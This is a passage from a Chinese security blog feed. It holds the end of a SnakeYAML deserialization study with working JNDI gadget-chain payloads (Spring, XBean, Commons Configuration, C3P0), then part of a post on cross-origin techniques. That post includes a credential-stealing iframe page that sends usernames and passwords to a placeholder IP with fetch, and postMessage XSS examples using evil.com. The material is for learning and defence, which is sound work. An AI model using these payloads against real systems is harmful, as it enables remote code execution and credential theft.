class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-beans<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后以下测试案例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calcTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">context</span> <span class="operator">=</span> <span class="string">&quot;!!org.springframework.beans.factory.config.PropertyPathFactoryBean\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; targetBeanName: \&quot;ldap://localhost:1389/test\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; propertyPath: test\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  shareableResources: [\&quot;ldap://localhost:1389/test\&quot;]&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(context);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Spring-DefaultBeanFactoryPointcutAdvisor"><a href="#Spring-DefaultBeanFactoryPointcutAdvisor" class="headerlink" title="Spring DefaultBeanFactoryPointcutAdvisor"></a>Spring DefaultBeanFactoryPointcutAdvisor</h3><p>需要有以下依赖：</p><p>snakeyaml-1.25，commons-logging-1.2，unboundid-ldapsdk-4.0.9，spring-beans-5.0.2.RELEASE，spring-context-5.0.2.RELEASE，spring-core-5.0.2.RELEASE，spring-aop-4.3.7.RELEASE。</p><p>此时poc如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">set:</span><br><span class="line">    ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor</span><br><span class="line">      adviceBeanName: <span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span></span><br><span class="line">      beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory</span><br><span class="line">        shareableResources: [<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>]</span><br><span class="line">    ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor []</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calcTest1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;src/main/resources/2.txt&quot;</span>));</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DefaultBeanFactoryPointcutAdvisor类的利用原理同上，也是JNDI注入漏洞导致的反序列化漏洞。</p><h3 id="Apache-XBean"><a href="#Apache-XBean" class="headerlink" title="Apache XBean"></a>Apache XBean</h3><p>导入依赖包</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.xbean<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xbean-naming<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.20<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>接下来就是 poc (这里参考Mi1k7ea师傅的文章，发现其poc少了一个空格，这里看了Y4tacker的payload才加上了，剩下的注意就是复制的时候，会有转义符”\“可能会影响操作结果)</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!javax.management.BadAttributeValueExpException</span> [<span class="type">!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding</span> [<span class="string">&quot;foo&quot;</span>,<span class="type">!!javax.naming.Reference</span> [<span class="string">&quot;foo&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>],<span class="type">!!org.apache.xbean.naming.context.WritableContext</span> []]]</span><br></pre></td></tr></table></figure><h3 id="Apache-Commons-Configuration"><a href="#Apache-Commons-Configuration" class="headerlink" title="Apache Commons Configuration"></a>Apache Commons Configuration</h3><p>依赖包：</p><p>snakeyaml-1.25，commons-logging-1.2，unboundid-ldapsdk-4.0.9，commons-lang-2.6，commons-configuration-1.10。</p><p>POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set:</span><br><span class="line">    ? !!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], <span class="string">&quot;ldap://localhost:1389/test&quot;</span>]]</span><br></pre></td></tr></table></figure><h3 id="C3P0"><a href="#C3P0" class="headerlink" title="C3P0"></a>C3P0</h3><p>先导入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mchange<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>c3p0<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.5.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mchange<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mchange-commons-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.2.15<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="JndiRefForwardingDataSource"><a href="#JndiRefForwardingDataSource" class="headerlink" title="JndiRefForwardingDataSource"></a>JndiRefForwardingDataSource</h4><p>poc如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">!!com.mchange.v2.c3p0.JndiRefForwardingDataSource</span><br><span class="line">  jndiName: <span class="string">&quot;ldap://localhost:1389/test&quot;</span></span><br><span class="line">  loginTimeout: <span class="number">0</span></span><br></pre></td></tr></table></figure><h4 id="WrapperConnectionPoolDataSource"><a href="#WrapperConnectionPoolDataSource" class="headerlink" title="WrapperConnectionPoolDataSource"></a>WrapperConnectionPoolDataSource</h4><p>poc如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://ce-automne.github.io/2020/02/08/Java-SPI%E6%9C%BA%E5%88%B6%E4%B8%8ESnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://ce-automne.github.io/2020/02/08/Java-SPI%E6%9C%BA%E5%88%B6%E4%B8%8ESnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><p><a href="https://www.mi1k7ea.com/2019/11/29/Java-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#%E5%A4%8D%E7%8E%B0%E5%88%A9%E7%94%A8%EF%BC%88%E5%9F%BA%E4%BA%8EScriptEngineManager%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89">https://www.mi1k7ea.com/2019/11/29/Java-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#%E5%A4%8D%E7%8E%B0%E5%88%A9%E7%94%A8%EF%BC%88%E5%9F%BA%E4%BA%8EScriptEngineManager%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89</a></p>]]></content>
    
    
    <summary type="html">对snakeyaml的学习</summary>
    
    
    
    <category term="java安全" scheme="https://h0ld1rs.github.io/categories/java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="java" scheme="https://h0ld1rs.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>跨域方式及产生的安全问题</title>
    <link href="https://h0ld1rs.github.io/posts/47799.html"/>
    <id>https://h0ld1rs.github.io/posts/47799.html</id>
    <published>2022-04-04T10:16:53.000Z</published>
    <updated>2022-04-21T10:33:53.381Z</updated>
    
    <content type="html"><![CDATA[<h1 id="跨域方式及产生的安全问题"><a href="#跨域方式及产生的安全问题" class="headerlink" title="跨域方式及产生的安全问题"></a>跨域方式及产生的安全问题</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>面试的时候，被很多师傅问到了这些问题，当时总结一下吧</p><h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>同源策略是一种约定，它是浏览器最核心也最基本的安全功能。以下特征被称之为同源</p><p>众所周知，同源策略需要满足三点：协议，域名，端口</p><p>同源策略有两种限制，第一种是限制了不同源之间的交互请求，例如，在使用<code>XMLHttpRequest</code> 或<code> fetch</code> 函数时则会受到同源策略的约束。第二种是限制浏览器中不同源的框架之间是不能进行<code>js</code>交互操作的。比如通过<code>iframe</code>和<code>window.open</code>产生的不同源的窗口。这两种限制都有不同的解决方案，下面会讲解不同的解决方案和可能产生的安全问题。</p><p>注：</p><ul><li>对于<code>&lt;a&gt; &lt;script&gt; &lt;img&gt; &lt;video&gt; &lt;link&gt;</code>这类属性带有src,href的标签，允许跨域加载</li><li>跨域请求可以发出，但是浏览器查看返回包发现跨域且无<code>CORS</code>头会丢弃，而且，不同子域之间默认是不同源的</li><li>IE 未将端口号加入到同源策略的组成部分之中，因此 <code>company.com:81/index.html</code> 和 <code>company.com/index.html</code> 属于同源并且不受任何限制。(IE，，，现在估计很少用了吧)</li></ul><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p><strong>如果没有同源策略，所有页面之间都可以相互读取，javascript就拥有无穷的权利。</strong></p><hr><p>假设A页面是一个很敏感的登录系统，现在受害者先访问了我们伪造的B网页，然后诱导其登录A网页</p><p>为了假设没有同源策略，我以<code>127.0.0.1:8001</code>为页面A和<code>127.0.0.1:8002</code>为页面B。现实中两个不同子域默认不同源。可以直接在phpstudy中进行设置进行复现。只是少了一个域名，效果还是一样的。</p><p><strong>aaa.evoa.me&#x2F;login.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- aaa.evoa.me/login.php --&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div style=<span class="string">&quot;margin-left: 100px&quot;</span>&gt;</span><br><span class="line">        &lt;form method=<span class="string">&quot;POST&quot;</span> id=<span class="string">&#x27;form&#x27;</span>&gt;</span><br><span class="line">            用户名: &lt;br/&gt;</span><br><span class="line">            &lt;input id=username type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;</span><br><span class="line">            &lt;br/&gt;</span><br><span class="line">            密码: &lt;br/&gt;</span><br><span class="line">            &lt;input id=password type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;</span><br><span class="line">            &lt;br/&gt;</span><br><span class="line">            &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;!-- 下面设置为了模拟假设没有同源策略 --&gt;         </span><br><span class="line">&lt;script&gt;</span><br><span class="line">    document.domain=<span class="string">&quot;evoa.me&quot;</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>bbb.evoa.me&#x2F;evil.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- bbb.evoa.me/evil.php --&gt;</span><br><span class="line">&lt;!-- 下面设置为了模拟假设没有同源策略 --&gt;  </span><br><span class="line">&lt;script&gt;</span><br><span class="line">    document.domain = <span class="string">&quot;evoa.me&quot;</span></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;iframe src=<span class="string">&quot;//aaa.evoa.me/login.php&quot;</span> id=<span class="string">&quot;iframe&quot;</span> width=<span class="number">100</span>% height=<span class="number">100</span>% frameborder=<span class="number">0</span>&gt; </span><br><span class="line">&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> ifrw = document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;iframe&#x27;</span>).contentWindow;</span><br><span class="line">    document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;iframe&#x27;</span>).onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        ifrw.document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;form&#x27;</span>).onsubmit = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> username =  ifrw.document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;username&#x27;</span>).value;</span><br><span class="line">            <span class="keyword">var</span> password =  ifrw.document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;password&#x27;</span>).value;</span><br><span class="line">            <span class="title function_ invoke__">fetch</span>(<span class="string">&#x27;//xxx.xxx.xxx.xxx/?username=&#x27;</span>+username+<span class="string">&#x27;&amp;&#x27;</span>+<span class="string">&#x27;password=&#x27;</span>+password);</span><br><span class="line">            &#125;   </span><br><span class="line">        &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="跨域传输数据的方式"><a href="#跨域传输数据的方式" class="headerlink" title="跨域传输数据的方式"></a>跨域传输数据的方式</h2><h3 id="document-domain"><a href="#document-domain" class="headerlink" title="document.domain"></a>document.domain</h3><p>此方法针对的是同源策略的第二个限制，即不同窗口之间的同源限制。且此方法只能影响顶级域名相同子域名不同之间的同源规则。</p><p>不同子域名之间默认不同源(如aaa.evoa.me与bbb.evoa.me)，但是可以通过设置document.domain为相同的更高级域名，来使不同子域同源。</p><p><strong>aaa.evoa.me&#x2F;1.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe id=<span class="string">&#x27;iframe&#x27;</span> src=<span class="string">&quot;//bbb.evoa.me/2.php&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p><strong>bbb.evoa.me&#x2F;2.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;<span class="number">123</span>&lt;/h1&gt;</span><br></pre></td></tr></table></figure><p>接下来修改<code>document.domain</code>进行一个操作：</p><p><strong>aaa.evoa.me&#x2F;1.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe id=<span class="string">&#x27;iframe&#x27;</span> src=<span class="string">&quot;//bbb.evoa.me/2.php&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;script&gt;document.domain = evoa.me&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>bbb.evoa.me&#x2F;2.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;<span class="number">123</span>&lt;/h1&gt;</span><br><span class="line">&lt;script&gt;document.domain = evoa.me&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li><p>document.domain 只可以被设置为他的当前域或其当前域的父域，比如aaa.evoa.me可以设置document.domain为aaa.evoa.me 或 evoa.me，但是不能设置为aaa.evoa.com或者bbb.aaa.evoa.me</p></li><li><p>document.domain 的赋值操作会导致端口号被重写为NULL，所以 aaa.evoa.me 仅设置document.domain为evoa.me 并不能与evoa.me进行通信，evoa.me的页面也必须赋值一次使双方端口相同从而通过浏览器的同源检测。这么做的目的是，如果子域有XSS，那么他的父域都存在安全隐患</p></li><li><p>设置document.domain并不会影响XMLHttpRequest 或 fetch的同源策略。</p></li><li><p>同一窗体不同窗口之间(iframe中的或window.open打开的），是能够获取到彼此的window对象的，如<code>iframe.contentWindow</code>可以获取iframe的window对象，但是不同源的情况下这个window对象的大部分属性和方法是受限制的。</p><p>如果某个子域为了和根域通信，根域设置了document.domain为根域，那么其他子域如果有xss漏洞可以直接跨同源攻击根域和同样设置了document.domain的其他子域</p></li></ul><h3 id="window-name"><a href="#window-name" class="headerlink" title="window.name"></a>window.name</h3><p>window对象有个name属性，该属性有个特征：即在一个窗口(window)的生命周期内,窗口载入的所有的页面都是共享一个window.name的，每个页面对window.name都有读写的权限，window.name是持久存在一个窗口载入过的所有页面中的，并不会因新页面的载入而进行重置。</p><p>举个例子，页面有个iframe，iframe中的页面为A，无论iframe中的页面A地址怎么更改，这个iframe对象都是共享同一个window.name，A页面设置window.name，再将iframe的src设置为B页面，B页面中的JS脚本可以读取到之前A页面设置的window.name，简而言之，window.name几乎不受同源策略的影响</p><p><strong>aaa.evoa.me&#x2F;1.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe id=<span class="string">&#x27;iframe&#x27;</span> src=<span class="string">&quot;//bbb.evoa.me/2.php&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p><strong>bbb.evoa.me&#x2F;2.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    window.name = <span class="string">&quot;flag&#123;this_is_flag&#125;&quot;</span>;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>aaa.evoa.me&#x2F;3.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;    <span class="title function_ invoke__">alert</span>(window.name);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>首先，我们访问iframe中的name属性，浏览器返回了跨域访问拒绝。但是我们通过设置iframe的src为3.php (3.php可以不与1.php同域)，在iframe中的所有页面共享window.name。然后<code>3.php</code>中的脚本访问到不同源的页面2.php并获取到了window.name</p><p>注：</p><ul><li>window.name的值只能是字符串的形式，这个字符串的大小最大能允许2M左右甚至更大的一个容量，具体取决于不同的浏览器</li></ul><p>所以，永远不要把敏感数据存在window.name中，否则敏感数据可以被任何其他网页的JS脚本获取</p><h3 id="location-hash"><a href="#location-hash" class="headerlink" title="location.hash"></a>location.hash</h3><p>location.hash其实就是 URL 的锚部分(从 # 号开始的部分)</p><p>具体原理是改变hash并不会导致页面刷新，所以可以利用hash值来进行数据传递。不同域下location.hash也是不能相互读取的</p><p>具体做法是，A域的页面a加载一个iframe，设置iframe的src为 <code>B域的b页面+#传输给b的数据</code>，此时b页面的js脚本可以通过读取location.hash获得页面a传过来的数据，然后在b页面再生成一个iframe，src指向<code>A域的页面c+#传输给a的数据</code>，由于页面c与页面a同域同源，所以页面c的脚本可以修改a的locaition.hash</p><h3 id="PostMessage"><a href="#PostMessage" class="headerlink" title="PostMessage"></a>PostMessage</h3><p><strong>window.postMessage()</strong> 方法可以安全地实现跨源通信，被调用时，会在所有页面脚本执行完毕之后向目标窗口派发一个 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/MessageEvent"><code>MessageEvent</code></a> 消息。 该函数的第一个参数为发送的消息，第二个参数是匹配发送给的窗口的url地址(可以使用<code>*</code>，代表无限制通配)，若目标url和此参数不匹配，消息就不会被发送。</p><p>被接受窗口则可以通过监听message事件来获取接受信息</p><p>例如：子窗口向父窗口传递数据</p><p><strong>aaa.evoa.me&#x2F;1.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe id=<span class="string">&#x27;iframe&#x27;</span> src=<span class="string">&quot;//bbb.evoa.me/2.php&quot;</span>&gt;&lt;/iframe&gt;&lt;script&gt;    window.<span class="title function_ invoke__">addEventListener</span>(<span class="string">&#x27;message&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;        <span class="title function_ invoke__">alert</span>(e.data);    &#125;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>bbb.evoa.me&#x2F;2.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;    <span class="built_in">parent</span>.<span class="title function_ invoke__">postMessage</span>(<span class="string">&#x27;evoA&#x27;</span>,<span class="string">&#x27;*&#x27;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>如果事件监听没有判断事件的来源，则会有很大的安全隐患，以下面为例</p><p><strong>evoa.me&#x2F;1.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>setcookie(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;flag&#123;this_is_flag&#125;&quot;</span>);<span class="meta">?&gt;</span>&lt;iframe id=<span class="string">&#x27;iframe&#x27;</span> src=<span class="string">&quot;//evoa.me/2.php&quot;</span>&gt;&lt;/iframe&gt;&lt;h1 id=<span class="string">&quot;name&quot;</span>&gt;&lt;/h1&gt;&lt;script&gt;    window.<span class="title function_ invoke__">addEventListener</span>(<span class="string">&#x27;message&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;        document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;name&#x27;</span>).innerHTML = e.data;    &#125;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>本来1.php应该接受来自2.php传过来的数据，但由于监听事件并没有任何判断，所以我们可以构造恶意网页，构造iframe src指向<code>evoa.me/1.php</code>往里面传数据造成xss</p><p><strong>evil.com&#x2F;evil.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe id=<span class="string">&quot;iframe&quot;</span> src=<span class="string">&quot;//evoa.me/1.php&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p>如果正则设置不当，依旧可能造成安全隐患</p><p><strong>evoa.me&#x2F;1.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>setcookie(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;flag&#123;this_is_flag&#125;&quot;</span>);<span class="meta">?&gt;</span>&lt;iframe id=<span class="string">&#x27;iframe&#x27;</span> src=<span class="string">&quot;//bbb.evoa.me/2.php&quot;</span>&gt;&lt;/iframe&gt;&lt;h1 id=<span class="string">&quot;name&quot;</span>&gt;&lt;/h1&gt;&lt;script&gt;    window.<span class="title function_ invoke__">addEventListener</span>(<span class="string">&#x27;message&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;        <span class="keyword">if</span>(/^http:\/\/.*evoa\.me$/.<span class="title function_ invoke__">test</span>(e.origin))        document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;name&#x27;</span>).innerHTML = e.data;    &#125;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>正则设置有误，我们可以购买域名aaaevoa.me进行绕过</p><p><strong>aaaevoa.me&#x2F;evil.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 